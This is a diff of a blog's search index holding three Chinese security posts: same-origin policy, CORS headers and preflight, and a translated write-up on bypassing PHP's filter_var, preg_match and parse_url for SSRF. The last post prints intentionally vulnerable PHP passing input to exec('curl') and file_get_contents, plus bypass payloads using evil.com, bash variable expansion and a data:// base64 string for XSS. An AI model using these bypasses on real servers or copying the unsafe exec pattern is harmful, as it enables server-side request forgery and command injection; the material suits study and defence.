+    <content type="text"><![CDATA[0x01 同源策略什么是同源策略？简单来说，同源策略就是同协议、同端口、同HOST。同源策略限制从一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的关键的安全机制。对于about:blank、javascript:这种特殊的URL，他们的源继承加载他们的页面的源，他们本身不存在源这个概念。 目前，如果非同源，共有三种行为受到限制。123（1） Cookie、LocalStorage 和 IndexDB 无法读取。（2） DOM 无法获得。（3） AJAX 请求不能发送。 0x02 HTTP请求控制总体来说，页面跨域行为主要有以下三类:Cross-origin read（跨域读）Cross-origin write（跨域写）Cross-origin embedding（跨域嵌入） 一般来说，只有Cross-origin read是不允许的，其他两种是被允许的。例如Cross-origin write的links、重定向、表单提交等，Cross-origin embedding的资源嵌入，在资源嵌入中，以下例子是被允许的12345678910111213&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;标签嵌入跨域脚本。语法错误信息只能在同源脚本中捕捉到。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;...&quot;&gt;`标签嵌入CSS。由于CSS的松散的语法规则，CSS的跨域需要一个设置正确的`Content-Type`消息头，不同浏览器有不同的限制。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;img&gt;嵌入图片。支持的图片格式包括PNG,JPEG,GIF,BMP,SVG,...&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;video&gt;和 &lt;audio&gt;嵌入多媒体资源。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;object&gt;, &lt;embed&gt; 和 &lt;applet&gt;的插件。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;@font-face引入的字体。一些浏览器允许跨域字体（cross-origin fonts），一些需要同源字体（same-origin fonts）。&lt;a class=&quot;md_block_a&quot; style=&quot;margin: 0px; padding: 0px; text-decoration: none;&quot;&gt;&lt;/a&gt;&lt;frame&gt;和&lt;iframe&gt;载入的任何资源。站点可以使用X-Frame-Options消息头来阻止这种形式的跨域交互。 那么当我们想要跨域读取又该怎么办呢？这是我们就得用到另一个协议CORS跨域资源共享 0x03 参考文献https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy]]></content>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>跨域</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[CORS（跨域资源共享）]]></title>
+    <url>%2F2018%2F05%2F31%2FCORS%EF%BC%88%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%EF%BC%89%2F</url>
+    <content type="text"><![CDATA[0x01 前言我们都知道，浏览器是遵循同源策略的，同源策略用来限制从一个源加载的文档或脚本如何与另一个源的的资源进行交互，这是一个用来隔离潜在的恶意文件的安全机制。通常来说，浏览器是允许跨域写和跨域嵌入，但是跨域读取一般是不允许的，但是这样肯定是不方便的，因此后来有了话语资源共享，用来实现跨域读的功能。 0x02 跨域资源共享跨域资源共享标准新增了一组 HTTP 首部字段，允许服务器声明哪些源站有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是GET以外的 HTTP 请求，或者搭配某些 MIME 类型的POST请求）浏览器必须首先使用OPTION方法发起一个预检请求，从而获知服务端是否允许该跨域请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（包括COOKIE和 HTTP 认证相关数据）。 0x03 简单请求与非简单请求这里简单请求是指那些不会引起CORS预检请求的那种请求，而同理，非简单请求就是引起CORS预检请求。 简单请求 只要同时满足以下两大条件，就属于简单请求。123456789（1) 请求方法是以下三种方法之一：HEADGETPOST（2）HTTP的头信息不超出以下几种字段：AcceptAccept-LanguageContent-LanguageContent-Type：只限于三个值application/x-www-form-urlencoded、multipart/form-data、text/plain 当浏览器发现请求是简单请求的时候，就会在请求头部添加一个Origin字段，该字段表示本次请求属于哪个源的，服务器会根据这个字段的值来决定是否允许跨域访问。 如果服务器不允许这个源的访问，那么服务器发送的response中，就没有Access-Control-Allow-Origin字段，当浏览器发现返回的消息中没有该字段，就知道出错了，从而抛出错误 如果服务器这个源的访问，那么服务器发送的response中，就会多出几个以Access-Control开头的字段 Access-Control-Allow-Origin 该字段是必须的，他表示允许访问的源，或者*，表示允许任意源访问。 Access-Control-Allow-Credentials 该字段是一个boolen值，如果是true，则允许发送cookie到服务器 Access-Control-Expose-Headers CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定 非简单请求 不同时满足上面的条件的就是非简单请求。 非简单请求的CORS请求，会在正式通信之前，增加一次HTTP查询请求，称为”预检”请求。浏览器先询问服务器，当前网页所在的域名是否在服务器的许可名单之中，以及可以使用哪些HTTP动词和头信息字段。只有得到肯定答复，浏览器才会发出正式的请求，否则就报错。 通常来说，预检请求是OPTION请求，在头信息中，包含着Origin字段，表示来自哪个源的。除了该字段，还有两个特殊的字段： Access-Control-Request-Method 该字段表示请求的方法是什么 Access-Control-Request-Headers 该字段是一个逗号分隔的字符串，指定浏览器CORS请求中出现的额外字段名。 当服务器同意了这次请求之后会在响应中添加相应的字段： Acces-Control-Allow-Origin 该字段表示允许的源 Access-Control-Allow-Method 该字段是必须的，是一个逗号分隔的字符串，表示服务器允许的跨域方法 Access-Control-Allow-Headers 如果请求中有Access-Control-Request-Headers字段的话，响应中就会有该字段，是一个逗号分隔的字符串，用来表示服务器允许的字段名。 Access-Control-Allow-Credentials 该字段也是用来表示服务器允许请求中包含cookie Access-Control-Max-Age 该字段表示本次预检请求的有效期，单位是秒。 但是如果服务器不允许请求，那么就会返回一个正常的HTTP Response给浏览器，浏览器发现响应中没有与CORS相关的字段，就知道服务器不允许这次请求，就会抛出错误。 0x04 参考文献http://www.ruanyifeng.com/blog/2016/04/cors.htmlhttps://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS]]></content>
+      <categories>
+        <category>Web前端</category>
+      </categories>
+      <tags>
+        <tag>Web前端</tag>
+        <tag>跨域</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[SSRF如何绕过filter_var和preg_match以及parse_url]]></title>
     <url>%2F2018%2F05%2F30%2FSSRF%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87filter-var%E5%92%8Cpreg-match%E4%BB%A5%E5%8F%8Aparse-url%2F</url>
     <content type="text"><![CDATA[0x01 前言这篇文章是在我看完一片国外安全大佬写的文章后对其进行总结并翻译得到的。 0x02 正文之绕过filter_var和preg_match本片文章主要深入一种php ssrf的技术——如何绕过例如filter_var(), preg_match()和parse_url()等函数。 本次我进行测试的php版本全部为php v5.6.30 PHP 漏洞代码12345678910111213141516171819202122232425&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; //check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL))&#123; //parse URL $r = parse_url($argv[1]); print_r($r); //check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;]))&#123; //get page from URL exec(&apos;curl -v -s &quot;&apos;.$r[&apos;host&apos;].&apos;&quot;&apos;, $a); print_r($a); &#125;else&#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125;else&#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这段代码里使用了filter_var()函数，preg_match()函数来进行过滤，并用parse_url()函数进行解析，最后利用exec函数执行curl命令进行访问网址。 在正式介绍绕过技术之前，我们需要了解一下以上函数的具体作用。 filter_var()filter_var — 使用特定的过滤器过滤一个变量 preg_match()该函数使用正则表达式来进行匹配特定的字符串 parse_url() ok，了解了这些函数后，说说上面的测试代码。这段代码的是获取第一个参数（这个参数是用来模拟通过$_GET或者$_POST方法获取的），然后通过filter_var()函数判断传入的url时候符合规定。如果如何规定，通过parse_url来解析这个参数，获取到host值，通过preg_match函数来判断host时候以baidu.com结尾。 运行上面的代码得到的正常结果如下： 如果不是正常的参数呢？ 1http://evil.com 绕过FILTER_VALIDATE_URL和正则表达式许多URL结构保留一些特殊的字符用来表示特殊的含义，这些符号在URL中不同的位置有着其特殊的语义。字符“;”, “/”, “?”, “:”, “@”, “=” 和“&amp;”是被保留的。除了分层路径中的点段，通用语法将路径段视为不透明。 生成URI的应用程序通常使用段中允许的保留字符来分隔。例如“；”和“=”用来分割参数和参数值。逗号也有着类似的作用。 例如，有的结构使用name;v=1.1来表示name的version是1.1，然而还可以使用name,1.1来表示相同的意思。当然对于URL来说，这些保留的符号还是要看URL的算法来表示他们的作用。 例如，如果用于hostname上，URL1http://evil.com;baidu.com 会被curl或者wget这样的工具解析为host:evil.com，querything:baidu.com 运行代码试一下 发现报错了，返回的是Invalid URL，那么因该是filter_var函数没有绕过。filter_var函数可以解析多种协议，我们可以试一下不是http的协议，例如10://evil.com;baidu.com ok,成功绕过filter_var和preg_match函数！但是我们发现它并没有解析我们的url，别担心，我们试试添加一下端口号，因为不是http的话默认端口就不是80了10://evil.com:80;baidu.com:80 ok，成功解析！ 当然，我们之前说的逗号也是可以跟分号是一个作用的 依旧成功！ 0x03 正文之绕过parse_urlparse_url函数不是用来验证URL的正确性的，而是尽可能的去解析URL，并把URL分割成特定的部分。在这种情况下，可以使用将URL的部分变为变量从而进行绕过。10://evil$baidu.com 这里，在bash中，$var是一个变量，在这个例子中$baidu这个变量未定义是个空，也就是说这个URL是0://evil&lt;空&gt;.com，也就是0://evil.com，成功绕过！ 但是这种方法也是有局限性的，因为需要利用bash中的特性，因此只有在php脚本中使用exec()、system()等命令执行的函数执行curl或者wget命令时才可以完成。 0x04 正文之data://伪协议和xss利用与上面的exec不同，这里我们使用的是filter_get_content函数，php的测试代码如下： 12345678910111213141516171819&lt;?php echo &quot;Argument: &quot;.$argv[1].&quot;\n&quot;; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match(&apos;/baidu\.com$/&apos;, $r[&apos;host&apos;])) &#123; // get page from URL $a = file_get_contents($argv[1]); echo($a); &#125; else &#123; echo &quot;Error: Host not allowed&quot;; &#125; &#125; else &#123; echo &quot;Error: Invalid URL&quot;; &#125;?&gt; 这次我们的任务是在响应主体中修改内容，添加一个“Hacked by Pino_HD” 1data://text/plain;base64,SGFja2VkIGJ5IFBpbm8Kbaidu.com 发现parse_url函数把text设置成了host，然后报了Host not allowed错误。但是别担心，我们可以注入一些东西到MIME类型的地方，因为php是不关心MIME类型的。。 1data://baidu.com/plain;base64,SGFja2VkIGJ5IFBpbm8K ok，成功在响应包中写入我们想要写的东西。因此我们是可以控制响应体的内容，从而形成xss]]></content>
@@ -156,8 +415,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>Web安全</tag>
+        <tag>反序列化</tag>
         <tag>PHP</tag>
       </tags>
   </entry>
@@ -169,8 +428,8 @@
         <category>Web安全</category>
       </categories>
       <tags>
-        <tag>反序列化</tag>
         <tag>Web安全</tag>
+        <tag>反序列化</tag>
         <tag>Python</tag>
       </tags>
   </entry>
@@ -306,8 +565,8 @@
       <tags>
         <tag>Java</tag>
         <tag>Java安全</tag>
-        <tag>反序列化</tag>
         <tag>Web安全</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
   <entry>
